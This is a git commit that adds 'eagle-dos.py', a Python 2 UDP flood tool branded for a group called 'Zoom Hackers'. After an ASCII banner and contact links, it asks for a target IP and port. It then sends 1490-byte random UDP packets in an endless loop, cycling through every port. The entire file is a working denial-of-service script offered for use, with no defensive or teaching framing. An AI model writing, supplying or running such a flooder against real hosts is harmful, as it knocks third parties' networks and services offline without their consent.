5e2349e4cfc31f878c37d387705ee7badb49877b
white-eagle <118425907+WH1T3-E4GL3@users.noreply.github.com>
2023-01-03 10:41:27 +0530

    Add files via upload

---
+++ eagle-dos.py
@@ -0,0 +1,46 @@
+import socket, os, random, time
+
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+os.system("clear")
+print 
+print "                              $$\                       $ \                     "         
+print "                              $$ |                      $$ |                    "
+print " $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ "
+print "$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|"
+print "$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  "
+print "$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ "
+print "\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |"
+print " \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ "
+print "                    $$\   $$ |                                                  "
+print "                    \$$$$$$  |                                                  "
+print "                     \______/                                                   "
+print 
+print "["+B+""+R+"#"+N+"] "+B+""+R+"Author : White Eagle"+N+"   Eagle Dos From - "+B+""+R+"Zoom Hackers"+N
+print
+print("\033[32m================================================================\033[0m")
+print("\033[32mTool devoloped : white-eagle\033[0m")
+print("\033[33mGithub 	       : https://github.com/WH1T3-E4GL3/\033[0m")
+print("\033[33mTelegram       : https://t.me/Ka_KsHi_HaTaKe\033[0m")
+print("\033[32m================================================================\033[0m")
+print
+
+ip = raw_input("[+] Target's IP : ")
+port = input('[+] Port: ')
+os.system("clear")
+print "Attack starting..."
+time.sleep(3)
+
+sent = 0
+while True:
+     white.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s "%(sent, ip, port)
+     if port == 65534:
+       port = 1
